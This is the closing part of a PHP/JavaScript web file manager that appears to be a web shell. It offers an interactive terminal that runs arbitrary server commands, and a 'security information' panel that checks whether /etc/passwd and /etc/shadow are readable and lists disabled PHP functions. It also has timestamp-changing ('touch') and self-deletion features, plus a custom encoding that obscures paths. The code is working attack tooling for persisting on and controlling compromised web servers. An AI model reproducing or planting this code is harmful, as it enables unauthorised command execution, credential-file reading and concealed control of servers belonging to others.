<?php echo htmlspecialchars($_SESSION['cmd_output']);unset($_SESSION['cmd_output']); ?></pre><button onclick="this.parentElement.remove()"class="clear-output-btn">‚úï</button></div><?php endif; ?></div><div class="search-container"><input id="file-search"placeholder="Search files and directories..."></div><div class="file-table-container"><div class="table-header-toolbar"><div class="form-group"><input type="checkbox"id="select-all"style="width:18px;height:18px"> <select id="bulk-action-select"><option value=""disabled selected>With selected...</option><option value="delete">Delete</option><option value="copy">Copy</option><option value="move">Move</option><option value="compress">Compress (TAR.GZ)</option><option value="download">Download (ZIP)</option></select> <span id="paste-option-container"></span> <button type="button"id="apply-bulk-action-btn">Apply</button></div></div><table class="file-table"><thead><tr><th class="col-select"></th><th class="col-name">Name</th><th class="col-size">Size</th><th class="col-owner">Owner:Group</th><th class="col-perms">Perms</th><th class="col-date">Modified</th><th class="col-actions">Actions</th></tr></thead><tbody id="file-list"></tbody></table><div class="no-results"id="no-results"style="display:none">No files match your search criteria.</div></div></div><div id="edit-view"><div class="card"><h3 id="edit-view-filename"style="margin-top:0;word-break:break-all"></h3><div class="editor-info"id="editor-info"></div><form id="edit-form"><input name="action"type="hidden"value="edit"> <input name="ajax"type="hidden"value="1"> <input name="file"type="hidden"id="edit-file-path"> <textarea id="edit-content"name="content"></textarea><div class="form-group"style="margin-top:16px"><button type="submit">Save</button> <a id="edit-cancel-btn"class="button"style="background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color)">Cancel</a></div></form></div></div></div><div id="modal-overlay"><div class="card"id="modal-box"><h3 id="modal-title"style="margin-top:0"></h3><form method="POST"id="modal-form"><input name="action"type="hidden"id="modal-action"> <input name="file"type="hidden"id="modal-file-path"> <input name="current_dir"type="hidden"class="form_current_dir"><div class="form-group"id="modal-body"></div><div class="form-group"style="margin-top:16px"><button type="submit">Save</button> <a id="modal-cancel-btn"class="button"style="background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color)">Cancel</a></div></form></div></div><div id="terminal-modal"><div class="card"><div class="terminal-header"><h3>Interactive Terminal</h3><button id="terminal-close-btn"class="terminal-close-btn">Close</button></div><div class="command-history"id="command-history"></div><div class="terminal-container"><div class="terminal-output"id="terminal-output"></div><div class="terminal-input-container"><input name="c"class="terminal-input"id="terminal-input"placeholder="Enter command..."> <button type="button"id="terminal-send"class="terminal-send">Send</button></div></div></div></div><div class="context-menu"id="context-menu"></div></div><script>const ICONS =<?php echo json_encode($icons); ?>; const BASEZERO_ALPHABET = '<?php echo BASEZERO_ALPHABET; ?>'; const SCRIPT_NAME = '<?php echo basename($_SERVER['PHP_SELF']); ?>'; function basezero_encoder_js(input) {let o = '';for (let i = 0; i < input.length; i++) {const v = input.charCodeAt(i);o += BASEZERO_ALPHABET[Math.floor(v / BASEZERO_ALPHABET.length)] + BASEZERO_ALPHABET[v % BASEZERO_ALPHABET.length]; }return o;}function basezero_decoder_js(input) {if (input.length % 2 !== 0) return false;let o = '';const map = Object.fromEntries(Array.from(BASEZERO_ALPHABET).map((c, i) => [c, i])); for (let i = 0; i < input.length; i += 2) {const c1 = map[input[i]], c2 = map[input[i+1]]; if (c1 === undefined || c2 === undefined) return false; o += String.fromCharCode((c1 * BASEZERO_ALPHABET.length) + c2); }return o;}document.addEventListener('DOMContentLoaded', () => { const app = {pathBar: document.getElementById('path-bar'), fileList: document.getElementById('file-list'), listingView: document.getElementById('listing-view'), editView: document.getElementById('edit-view'), messageContainer: document.getElementById('message-container'), modalOverlay: document.getElementById('modal-overlay'), modalTitle: document.getElementById('modal-title'), modalBody: document.getElementById('modal-body'), modalAction: document.getElementById('modal-action'), modalFilePath: document.getElementById('modal-file-path'), currentPath: '',pasteContainer: document.getElementById('paste-option-container'), fileSearch: document.getElementById('file-search'), contextMenu: document.getElementById('context-menu'), contextTarget: null,filesData: [],terminalHistory: [],terminalModal: document.getElementById('terminal-modal'), terminalOutput: document.getElementById('terminal-output'), terminalInput: document.getElementById('terminal-input'), isWindows: false,currentUser: 'user',customHistory:<?php echo json_encode($_SESSION['cmd_history']); ?>, historyIndex: -1,init() {this.handleHashChange();window.addEventListener('hashchange', () => this.handleHashChange()); document.getElementById('path-go-btn').addEventListener('click', () => this.navigateToPath()); document.getElementById('path-input').addEventListener('keypress', e => { if (e.key === 'Enter') this.navigateToPath(); });document.getElementById('file-open-btn').addEventListener('click', () => this.openFileByPath()); document.getElementById('file-path-input').addEventListener('keypress', e => { if (e.key === 'Enter') this.openFileByPath(); });document.getElementById('sec-info-btn').addEventListener('click', () => this.showSecurityInfo()); document.getElementById('self-remove-btn').addEventListener('click', () => this.confirmSelfRemove()); document.getElementById('edit-form').addEventListener('submit', e => this.handleEditSave(e)); document.getElementById('edit-cancel-btn').addEventListener('click', e => this.showListingView(e)); document.getElementById('file-list').addEventListener('click', e => this.handleActionClick(e)); document.getElementById('refresh-btn').addEventListener('click', e => { e.preventDefault(); this.handleHashChange(); }); document.getElementById('terminal-btn').addEventListener('click', e => { e.preventDefault(); this.showTerminal(); }); document.getElementById('terminal-close-btn').addEventListener('click', e => { e.preventDefault(); this.hideTerminal(); }); document.getElementById('apply-bulk-action-btn').addEventListener('click', e => this.handleBulkAction(e)); document.getElementById('select-all').addEventListener('change', e => this.toggleSelectAll(e)); document.getElementById('file-list').addEventListener('change', e => this.handleRowSelect(e)); document.getElementById('modal-cancel-btn').addEventListener('click', e => { e.preventDefault(); this.hideModal(); }); this.modalOverlay.addEventListener('click', e => { if (e.target === this.modalOverlay) this.hideModal(); }); this.terminalModal.addEventListener('click', e => { if (e.target === this.terminalModal) this.hideTerminal(); }); this.fileSearch.addEventListener('input', e => this.handleSearch(e)); document.addEventListener('contextmenu', e => this.handleContextMenu(e)); document.addEventListener('click', e => this.hideContextMenu(e)); window.addEventListener('resize', () => this.hideContextMenu()); document.getElementById('terminal-send').addEventListener('click', e => this.sendCommand()); this.terminalInput.addEventListener('keydown', e => { if (e.key === 'Enter') {e.preventDefault();this.sendCommand();} else if (e.key === 'ArrowUp') {e.preventDefault();if (this.historyIndex < this.customHistory.length - 1) { this.historyIndex++;this.terminalInput.value = this.customHistory[this.historyIndex]; }} else if (e.key === 'ArrowDown') {e.preventDefault();if (this.historyIndex > 0) {this.historyIndex--;this.terminalInput.value = this.customHistory[this.historyIndex]; } else if (this.historyIndex === 0) {this.historyIndex = -1;this.terminalInput.value = '';}}});},updateFilePathPlaceholder() {const input = document.getElementById('file-path-input'); if (input && this.currentPath) {input.placeholder = `filename.txt or ${this.currentPath}/filename.txt`; }},async openFileByPath() {const input = document.getElementById('file-path-input'); const filePath = input.value.trim();if (!filePath) {this.showMessage('Please enter a file path.', true); return;}try {const formData = new FormData();formData.append('file_path', filePath);formData.append('current_path', this.currentPath); const response = await fetch(`${SCRIPT_NAME}?action=open_file_by_path`, { method: 'POST',body: formData});const result = await response.json();if (result.success && result.action === 'open_editor') { input.value = '';this.openEditorWithFileData(result);} else {this.showMessage(result.message, true);setTimeout(() => {const currentMessage = this.messageContainer.querySelector('.message.error'); if (currentMessage) {this.messageContainer.innerHTML = '';}}, 5000);}} catch (error) {this.showMessage('Network error: ' + error.message, true); setTimeout(() => {const currentMessage = this.messageContainer.querySelector('.message.error'); if (currentMessage) {this.messageContainer.innerHTML = '';}}, 5000);}},openEditorWithFileData(fileData) {document.getElementById('edit-view-filename').textContent = `Editing: ${fileData.filename}`; document.getElementById('edit-file-path').value = fileData.file_path; const textarea = document.getElementById('edit-content'); const infoDiv = document.getElementById('editor-info'); let typeInput = document.getElementById('edit-file-type'); let encodingInput = document.getElementById('edit-encoding'); if (!typeInput) {typeInput = document.createElement('input'); typeInput.type = 'hidden';typeInput.name = 'file_type';typeInput.id = 'edit-file-type';document.getElementById('edit-form').appendChild(typeInput); }if (!encodingInput) {encodingInput = document.createElement('input'); encodingInput.type = 'hidden';encodingInput.name = 'encoding';encodingInput.id = 'edit-encoding';document.getElementById('edit-form').appendChild(encodingInput); }typeInput.value = fileData.file_type;encodingInput.value = fileData.encoding;textarea.value = fileData.content;const byteLength = new Blob([fileData.content]).size; const lineCount = fileData.content.split('\n').length; const fileInfo = `${lineCount} lines, ${byteLength} bytes`; const typeInfo = fileData.file_type === 'binary' ?`Binary file (${fileData.printable_ratio}% printable)` : `Mixed content (${fileData.printable_ratio}% printable)`; const permInfo = `${fileData.permissions} | ${fileData.owner} | ${fileData.modified}`; infoDiv.innerHTML = `<div style="margin-bottom: 8px;">${fileInfo} | ${typeInfo}<br>Permissions: ${permInfo}</div><div style="display: flex; gap: 8px; flex-wrap: wrap;"> <button type="button" onclick="app.fileAction('chmod', '${fileData.file_path}', '${fileData.permissions}')" class="btn-small">Chmod</button> <button type="button" onclick="app.fileAction('rename', '${fileData.file_path}')" class="btn-small">Rename</button> <button type="button" onclick="app.fileAction('touch', '${fileData.file_path}', '${fileData.modified}')" class="btn-small">Touch</button> <button type="button" onclick="window.open('${SCRIPT_NAME}?action=download&file=${encodeURIComponent(fileData.file_path)}', '_blank')" class="btn-small">Download</button> <button type="button" onclick="app.fileAction('delete', '${fileData.file_path}')" class="btn-small danger" style="background: var(--color-red); color: white;">Delete</button> </div>`;this.listingView.style.display = 'none';this.editView.style.display = 'block';setTimeout(() => textarea.focus(), 100);},fileAction(action, filePath, currentValue = '') { const fileData = {path: filePath,perms: currentValue,modified: currentValue};this.handleActionModal(action, fileData);},async handleHashChange() {this.hideModal();this.hideTerminal();const pathEncoded = window.location.hash.substring(1); if (!pathEncoded) {const currentDir = '<?php echo addslashes(getcwd()); ?>'; window.location.hash = basezero_encoder_js(currentDir); return;}this.fetchDirectory(pathEncoded);},async fetchDirectory(pathEncoded) {this.fileList.innerHTML = `<tr><td colspan="7" style="text-align:center; padding:40px;">Loading...</td></tr>`; try {const response = await fetch(`${SCRIPT_NAME}?action=list&path=${pathEncoded}`); const data = await response.json();if (data.success) {this.isWindows = data.path.is_windows;this.currentUser = data.user;this.render(data);} else {this.showMessage(data.message + (data.debug ? ' [Debug: ' + JSON.stringify(data.debug) + ']' : ''), true); }} catch (error) {this.showMessage('Network or server error: ' + error.message, true); }},render(data) {this.currentPath = data.path.current;this.filesData = data.files;this.updatePathBar(data.path);this.updateFileList(data.files);this.updateBulkActions(data.clipboard);this.updateFormsCurrentDir(data.path.current); this.updateFilePathPlaceholder();this.showListingView();this.fileSearch.value = '';document.getElementById('path-input').value = this.currentPath; },navigateToPath() {const inputPath = document.getElementById('path-input').value.trim(); if (!inputPath) return;const normalizedPath = inputPath.replace(/[\\]/g, '/'); window.location.hash = basezero_encoder_js(normalizedPath); },showSecurityInfo() {this.modalTitle.textContent = 'Server Security Information'; this.modalAction.value = '';this.modalFilePath.value = '';const infoHtml = `<div style="font-family: var(--font-mono); font-size: 12px; line-height: 1.6; max-height: 60vh; overflow-y: auto;"> <strong>Server software:</strong><?php echo isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'Unknown'; ?><br> <strong>PHP Version:</strong><?php echo PHP_VERSION; ?><br> <strong>OS:</strong><?php echo php_uname(); ?><br><br> <strong>Loaded Apache modules:</strong><br><?php if(function_exists('apache_get_modules')){echo implode(', ',apache_get_modules());}else{echo 'apache_get_modules() not available';} ?><br><br> <strong>Disabled PHP Functions:</strong><br><?php $disabled=ini_get('disable_functions');echo empty($disabled)?'none':$disabled; ?><br><br> <strong>cURL support:</strong><?php echo function_exists('curl_version')?'enabled':'disabled'; ?><br> <strong>MySQLi support:</strong><?php echo extension_loaded('mysqli')?'enabled':'disabled'; ?><br><br> <strong>Readable /etc/passwd:</strong><?php echo is_readable('/etc/passwd')?'yes':'no'; ?><br> <strong>Readable /etc/shadow:</strong><?php echo is_readable('/etc/shadow')?'yes':'no'; ?><br><br> <strong>OS version:</strong><br><?php echo@file_get_contents('/proc/version')?@file_get_contents('/proc/version'):'N/A'; ?><br><br> <strong>Memory limit:</strong><?php echo ini_get('memory_limit'); ?><br> <strong>Max execution time:</strong><?php echo ini_get('max_execution_time'); ?>s<br> <strong>Upload max filesize:</strong><?php echo ini_get('upload_max_filesize'); ?><br> </div>`;this.modalBody.innerHTML = infoHtml;this.showModal();},confirmSelfRemove() {if (confirm('Are you sure you want to delete this file manager? This action cannot be undone!')) { if (confirm('FINAL WARNING: This will permanently delete the file manager script. Continue?')) { fetch(SCRIPT_NAME, {method: 'POST',headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'action=self_remove&confirm=yes'}).then(() => {alert('File manager has been deleted.');window.location.href = './';}).catch(() => {alert('Self-removal failed. Please delete manually.'); });}}},updatePathBar({ breadcrumbs, permission_status, is_windows }) { let html = '<strong>Path:</strong> ';if (is_windows) {let rootPath = 'C:\\';let driveLetter = 'C';if (breadcrumbs.length > 0) {rootPath = breadcrumbs[0].path;if (rootPath.length >= 2 && rootPath[1] === ':') { driveLetter = rootPath[0].toUpperCase();rootPath = driveLetter + ':\\';}} else if (this.currentPath) {if (this.currentPath.length >= 2 && this.currentPath[1] === ':') { driveLetter = this.currentPath[0].toUpperCase(); rootPath = driveLetter + ':\\';}}html += `<a href="#${basezero_encoder_js(rootPath)}" class="path-root"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6 2c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6H6zm0 2h7v5h5v11H6V4z"/></svg> ${driveLetter}:\\</a>`;} else {html += `<a href="#${basezero_encoder_js('/')}" class="path-root"> ${ICONS.home}Root</a>`;}breadcrumbs.forEach((p, index) => {if (is_windows && p.name.match(/^[A-Za-z]:$/)) return; const customClass = ' class="path-custom"';html += `<span>/</span><a href="#${basezero_encoder_js(p.path)}"${customClass}>${p.name}</a>`; });html += `<span class="path-status ${permission_status}">[ ${permission_status.charAt(0).toUpperCase() + permission_status.slice(1)} ]</span>`; this.pathBar.innerHTML = html;},updateFileList(files) {let html = '';files.forEach((f, index) => {html += `<tr class="item-row" data-index="${index}"><td class="col-select"><input type="checkbox" name="selected_files[]" value="${f.path}" class="item-checkbox" style="width:18px;height:18px;"></td>`; const icon = f.type === 'dir' ? ICONS.dir : ICONS.file; let nameLink;if (f.type === 'dir') {nameLink = `<a href="#${basezero_encoder_js(f.path)}" data-path="${f.path}" data-is-dir="true">${icon}${f.name}</a>`; } else {nameLink = `<a href="#" class="file-edit-link" data-path="${f.path}" data-name="${f.name}" data-is-dir="false">${icon}${f.name}</a>`; }html += `<td class="col-name"><div title="${f.path}">${nameLink}</div></td>`; html += `<td class="col-size">${f.size}</td><td class="col-owner">${f.owner}</td><td class="col-perms perms-${f.permission_status}">${f.perms}</td><td class="col-date">${f.modified}</td>`; let actions = '';if (f.type === 'dir') {if (f.name !== '..') {const chmodBtn = this.isWindows ? '' : `<a class="action-btn" title="Chmod" data-action="chmod" data-path="${f.path}" data-perms="${f.perms}">${ICONS.chmod}</a>`; actions = `${chmodBtn}<a class="action-btn" title="Touch" data-action="touch" data-path="${f.path}" data-time="${f.modified}">${ICONS.touch}</a><a class="action-btn" title="Rename" data-action="rename" data-path="${f.path}">${ICONS.rename}</a>`; }} else {const chmodBtn = this.isWindows ? '' : `<a class="action-btn" title="Chmod" data-action="chmod" data-path="${f.path}" data-perms="${f.perms}">${ICONS.chmod}</a>`; actions = `<a class="action-btn" title="Edit" data-action="edit" data-path="${f.path}">${ICONS.edit}</a>${chmodBtn}<a class="action-btn" title="Touch" data-action="touch" data-path="${f.path}" data-time="${f.modified}">${ICONS.touch}</a><a class="action-btn" title="Rename" data-action="rename" data-path="${f.path}">${ICONS.rename}</a><a href="${SCRIPT_NAME}?action=download&file=${encodeURIComponent(f.path)}" title="Download" target="_blank">${ICONS.download}</a>`; }html += `<td class="text-actions">${actions}</td></tr>`; });this.fileList.innerHTML = html;this.fileList.querySelectorAll('.file-edit-link').forEach(link => { link.addEventListener('click', (e) => {e.preventDefault();const path = link.dataset.path;const name = link.dataset.name;this.showEditView(path, name);});});this.updateSearchResults();},updateFormsCurrentDir(path) {document.querySelectorAll('.form_current_dir').forEach(input => input.value = path); },updateBulkActions(clipboard) {const select = document.getElementById('bulk-action-select'); const existingPaste = select.querySelector('option[value="paste"]'); if (existingPaste) existingPaste.remove();if (clipboard && clipboard.sources && clipboard.sources.length > 0) { const pasteOpt = document.createElement('option'); pasteOpt.value = 'paste';pasteOpt.textContent = `Paste (${clipboard.sources.length})`; select.appendChild(pasteOpt);}},handleSearch(e) {const query = e.target.value.toLowerCase();this.updateSearchResults(query);},updateSearchResults(query = '') {const rows = this.fileList.querySelectorAll('.item-row'); const noResults = document.getElementById('no-results'); let visibleCount = 0;rows.forEach(row => {if (query === '') {row.classList.remove('hidden');visibleCount++;} else {const nameCell = row.querySelector('.col-name a'); const fileName = nameCell ? nameCell.textContent.toLowerCase() : ''; if (fileName.includes(query)) {row.classList.remove('hidden');visibleCount++;} else {row.classList.add('hidden');}}});if (query !== '' && visibleCount === 0) {noResults.style.display = 'block';} else {noResults.style.display = 'none';}},handleContextMenu(e) {const fileRow = e.target.closest('.item-row'); if (!fileRow || e.target.closest('.text-actions')) return; e.preventDefault();const index = parseInt(fileRow.dataset.index); if (index >= 0 && this.filesData[index]) {this.contextTarget = this.filesData[index];this.showContextMenu(e.clientX, e.clientY);}},showContextMenu(x, y) {if (!this.contextTarget) return;const f = this.contextTarget;let menuItems = [];if (f.type === 'dir') {if (f.name !== '..') {menuItems = [{ action: 'copy', text: 'Copy', icon: 'üìã' }, { action: 'move', text: 'Move', icon: '‚úÇÔ∏è' }, { action: 'delete', text: 'Delete', icon: 'üóëÔ∏è' }, { action: 'touch', text: 'Change Time', icon: ICONS.touch }, { action: 'rename', text: 'Rename', icon: ICONS.rename } ];if (!this.isWindows) {menuItems.splice(3, 0, { action: 'chmod', text: 'Change Permissions', icon: ICONS.chmod }); }}} else {menuItems = [{ action: 'edit', text: 'Edit', icon: ICONS.edit }, { action: 'download', text: 'Download', icon: ICONS.download }, { action: 'copy', text: 'Copy', icon: 'üìã' }, { action: 'move', text: 'Move', icon: '‚úÇÔ∏è' }, { action: 'delete', text: 'Delete', icon: 'üóëÔ∏è' }, { action: 'touch', text: 'Change Time', icon: ICONS.touch }, { action: 'rename', text: 'Rename', icon: ICONS.rename } ];if (!this.isWindows) {menuItems.splice(5, 0, { action: 'chmod', text: 'Change Permissions', icon: ICONS.chmod }); }}let html = '';menuItems.forEach(item => {html += `<div class="context-menu-item" data-action="${item.action}">${item.icon} ${item.text}</div>`; });this.contextMenu.innerHTML = html;const menuRect = { width: 160, height: menuItems.length * 42 + 8 }; const viewport = { width: window.innerWidth, height: window.innerHeight }; let finalX = x;let finalY = y;if (x + menuRect.width > viewport.width) {finalX = x - menuRect.width;}if (y + menuRect.height > viewport.height) { finalY = y - menuRect.height;}finalX = Math.max(5, Math.min(finalX, viewport.width - menuRect.width - 5)); finalY = Math.max(5, Math.min(finalY, viewport.height - menuRect.height - 5)); this.contextMenu.style.left = finalX + 'px'; this.contextMenu.style.top = finalY + 'px';this.contextMenu.style.display = 'block';this.contextMenu.querySelectorAll('.context-menu-item').forEach(item => { item.addEventListener('click', () => {const action = item.dataset.action;this.handleContextAction(action, this.contextTarget); this.hideContextMenu();});});},hideContextMenu() {this.contextMenu.style.display = 'none';this.contextTarget = null;},handleContextAction(action, fileData) {if (action === 'download') {window.open(`${SCRIPT_NAME}?action=download&file=${encodeURIComponent(fileData.path)}`, '_blank'); } else if (action === 'copy' || action === 'move') { const clipboard_data = { action: action, sources: [fileData.path] }; document.cookie = `fm_clipboard=${encodeURIComponent(JSON.stringify(clipboard_data))}; path=/; max-age=3600`; this.showMessage(`${fileData.name} added to clipboard for ${action}.`); this.fetchDirectory(basezero_encoder_js(this.currentPath)); } else if (action === 'delete') {if (confirm(`Are you sure you want to delete "${fileData.name}"?`)) { this.performSingleDelete(fileData.path);}} else {this.handleActionModal(action, fileData);}},handleActionClick(e) {const btn = e.target.closest('a.action-btn'); if (!btn) return;e.preventDefault();const action = btn.dataset.action;const path = btn.dataset.path;const fileData = this.filesData.find(f => f.path === path); if (fileData) this.handleActionModal(action, fileData); },handleActionModal(action, fileData) {const filename = fileData.name;if (action === 'edit') {this.showEditView(fileData.path, filename);} else {this.modalTitle.textContent = `${action.charAt(0).toUpperCase() + action.slice(1)}: ${filename}`; this.modalAction.value = action;this.modalFilePath.value = fileData.path;let formHtml = '';if (action === 'rename') {formHtml = `<input type="text" name="new_name" value="${filename}" required style="width:100%">`; }if (action === 'chmod') {if (this.isWindows) {formHtml = `<p style="color: var(--color-orange);">Chmod has limited functionality on Windows. Windows uses ACLs instead of Unix permissions.</p>`; } else {formHtml = `Current: <strong>${fileData.perms}</strong><br><input type="text" name="perms" placeholder="644 (without leading 0)" required style="width:100%">`; }}if (action === 'touch') {formHtml = `<input type="text" name="datetime" value="${fileData.modified}" required style="width:100%">`; }this.modalBody.innerHTML = formHtml;this.showModal();}},async showEditView(path, filename) {try {const response = await fetch(`${SCRIPT_NAME}?action=get_content&path=${basezero_encoder_js(path)}`); const data = await response.json();if (data.success) {document.getElementById('edit-view-filename').textContent = `Editing: ${filename}`; document.getElementById('edit-file-path').value = path; const textarea = document.getElementById('edit-content'); const infoDiv = document.getElementById('editor-info'); let typeInput = document.getElementById('edit-file-type'); let encodingInput = document.getElementById('edit-encoding'); if (!typeInput) {typeInput = document.createElement('input'); typeInput.type = 'hidden';typeInput.name = 'file_type';typeInput.id = 'edit-file-type';document.getElementById('edit-form').appendChild(typeInput); }if (!encodingInput) {encodingInput = document.createElement('input'); encodingInput.type = 'hidden';encodingInput.name = 'encoding';encodingInput.id = 'edit-encoding';document.getElementById('edit-form').appendChild(encodingInput); }typeInput.value = data.file_type;encodingInput.value = data.encoding;if (data.file_type === 'binary') {textarea.value = data.content;textarea.style.fontFamily = 'monospace';textarea.style.fontSize = '11px';infoDiv.innerHTML = `<span style="color: #ff9800;">‚ö†Ô∏è Binary file (${data.printable_ratio}% printable)</span><br> Content displayed as HEX. Edit carefully to avoid corruption.<br> <small>Each byte represented as 2 hex characters (00-FF)</small> `;infoDiv.style.background = 'rgba(255, 152, 0, 0.1)'; infoDiv.style.padding = '8px';infoDiv.style.borderRadius = '4px';} else {textarea.value = data.content;textarea.style.fontFamily = 'monospace';textarea.style.fontSize = '13px';const byteLength = new Blob([data.content]).size; const lineCount = data.content.split('\n').length; const fileInfo = `${lineCount} lines, ${byteLength} bytes`; const typeInfo = `Mixed content (${data.printable_ratio}% printable)`; const permInfo = data.permissions ? `${data.permissions} | ${data.owner} | ${data.modified}` : ''; infoDiv.innerHTML = `<div style="margin-bottom: 8px;">${fileInfo} | ${typeInfo}${permInfo ? '<br>Permissions: ' + permInfo : ''} </div><div style="display: flex; gap: 8px; flex-wrap: wrap;"> <button type="button" onclick="app.fileAction('chmod', '${path}', '${data.permissions || ''}')" class="btn-small">Chmod</button> <button type="button" onclick="app.fileAction('rename', '${path}')" class="btn-small">Rename</button> <button type="button" onclick="app.fileAction('touch', '${path}', '${data.modified || ''}')" class="btn-small">Touch</button> <button type="button" onclick="window.open('${SCRIPT_NAME}?action=download&file=${encodeURIComponent(path)}', '_blank')" class="btn-small">Download</button> <button type="button" onclick="app.fileAction('delete', '${path}')" class="btn-small danger" style="background: var(--color-red); color: white;">Delete</button> </div>`;infoDiv.style.background = '';infoDiv.style.padding = '';}this.listingView.style.display = 'none';this.editView.style.display = 'block';setTimeout(() => {textarea.focus();if (data.file_type !== 'binary') {textarea.setSelectionRange(textarea.value.length, textarea.value.length); }}, 100);} else {this.showMessage(data.message, true);}} catch (error) {this.showMessage('Could not fetch file content: ' + error.message, true); }},async handleEditSave(e) {e.preventDefault();const formData = new FormData(e.target);try {const response = await fetch(SCRIPT_NAME, { method: 'POST', body: formData }); const result = await response.json();this.showMessage(result.message, !result.success); } catch (error) {this.showMessage('Save failed: ' + error.message, true); }},async handleBulkAction(e) {e.preventDefault();const select = document.getElementById('bulk-action-select'); const action = select.value;const selected = Array.from(document.querySelectorAll('.item-checkbox:checked')).map(cb => cb.value); if (!action) {this.showMessage('Please select an action.', true); return;}if (selected.length === 0 && action !== 'paste') { this.showMessage('Please select at least one item.', true); return;}if (action === 'delete' && !confirm(`Are you sure you want to delete ${selected.length} item(s)?`)) return; const formData = new FormData();formData.append('ajax', '1');formData.append('bulk_action', action);formData.append('current_dir', this.currentPath); selected.forEach(item => formData.append('selected_files[]', item)); try {const response = await fetch(SCRIPT_NAME, { method: 'POST', body: formData }); const result = await response.json();this.showMessage(result.message, !result.success); if (result.success) {if (action === 'download' && result.download_file) { window.open(`${SCRIPT_NAME}?action=download&file=${encodeURIComponent(this.currentPath + '/' + result.download_file)}`, '_blank'); setTimeout(() => {fetch(SCRIPT_NAME, {method: 'POST',headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `action=cleanup_download&file=${encodeURIComponent(result.download_file)}&current_dir=${encodeURIComponent(this.currentPath)}` });}, 5000);}this.fetchDirectory(basezero_encoder_js(this.currentPath)); this.updateBulkActions(result.clipboard);}} catch (error) {this.showMessage('Bulk action failed: ' + error.message, true); }select.selectedIndex = 0;},showTerminal() {this.terminalModal.style.display = 'flex';this.terminalOutput.textContent = '';this.updateTerminalHistory();setTimeout(() => this.terminalInput.focus(), 300); },hideTerminal() {this.terminalModal.style.display = 'none';},shortenPath(path) {if (path.length <= 30) return path;if (this.isWindows) {const parts = path.split('\\');if (parts.length <= 3) return path;return parts[0] + '\\...\\' + parts[parts.length - 1]; } else {const parts = path.split('/');if (parts.length <= 3) return path;if (path.includes('/home/')) {const homeIndex = parts.indexOf('home');if (homeIndex >= 0 && homeIndex + 1 < parts.length) { const username = parts[homeIndex + 1];if (path.startsWith(`/home/${username}`)) {const relativePath = path.substring(`/home/${username}`.length) || '/'; if (relativePath.length <= 25) {return '~' + relativePath;} else {return '~/...' + relativePath.substring(relativePath.lastIndexOf('/')); }}}}return '.../' + parts[parts.length - 1];}},async sendCommand() {const command = this.terminalInput.value.trim(); if (!command) return;const shortPath = this.shortenPath(this.currentPath); this.terminalOutput.textContent += `${shortPath}@${this.currentUser} $ ${command}\n`; this.terminalInput.value = '';try {const formData = new FormData();formData.append('c', command);formData.append('current_path', this.currentPath); const response = await fetch(`${SCRIPT_NAME}?action=terminal_cmd`, { method: 'POST', body: formData }); const result = await response.json();this.terminalOutput.textContent += result.output + '\n\n'; this.terminalOutput.scrollTop = this.terminalOutput.scrollHeight; if (!this.customHistory.includes(command)) { this.customHistory.unshift(command);this.customHistory = this.customHistory.slice(0, 50); }this.historyIndex = -1;this.updateTerminalHistory();} catch (error) {this.terminalOutput.textContent += 'Error: Failed to execute command - ' + error.message + '\n\n'; }},updateTerminalHistory() {const historyContainer = document.getElementById('command-history'); if (!historyContainer) return;if (this.customHistory.length === 0) {historyContainer.innerHTML = '<div style="text-align:center; color: var(--text-muted); padding: 10px; font-size: 11px;">No command history</div>'; return;}historyContainer.innerHTML = this.customHistory.slice(0, 8).map(cmd => `<div class="history-item" title="Click to use">${cmd}</div>` ).join('');historyContainer.querySelectorAll('.history-item').forEach(item => { item.addEventListener('click', () => {this.terminalInput.value = item.textContent; this.terminalInput.focus();});});},showListingView(e) {if(e) e.preventDefault();this.listingView.style.display = 'block';this.editView.style.display = 'none';},showMessage(msg, isError = false) {this.messageContainer.innerHTML = `<div class="message ${isError ? 'error' : ''}">${msg}</div>`; setTimeout(() => this.messageContainer.innerHTML = '', isError ? 4000 : 1500); },showModal() {this.modalOverlay.style.display = 'flex';},hideModal() {this.modalOverlay.style.display = 'none';},toggleSelectAll(e) {const visibleCheckboxes = Array.from(document.querySelectorAll('.item-checkbox')).filter(cb => !cb.closest('.item-row').classList.contains('hidden') );visibleCheckboxes.forEach(c => {c.checked = e.target.checked;c.closest('.item-row').classList.toggle('selected', e.target.checked); });},handleRowSelect(e) {if (e.target.classList.contains('item-checkbox')) e.target.closest('.item-row').classList.toggle('selected', e.target.checked); },async performSingleDelete(filePath) {const formData = new FormData();formData.append('ajax', '1');formData.append('bulk_action', 'delete');formData.append('current_dir', this.currentPath); formData.append('selected_files[]', filePath); try {const response = await fetch(SCRIPT_NAME, { method: 'POST', body: formData }); const result = await response.json();this.showMessage(result.message, !result.success); if (result.success) {this.fetchDirectory(basezero_encoder_js(this.currentPath)); }} catch (error) {this.showMessage('Delete failed: ' + error.message, true); }}};window.app = app;app.init();});</script></body></html>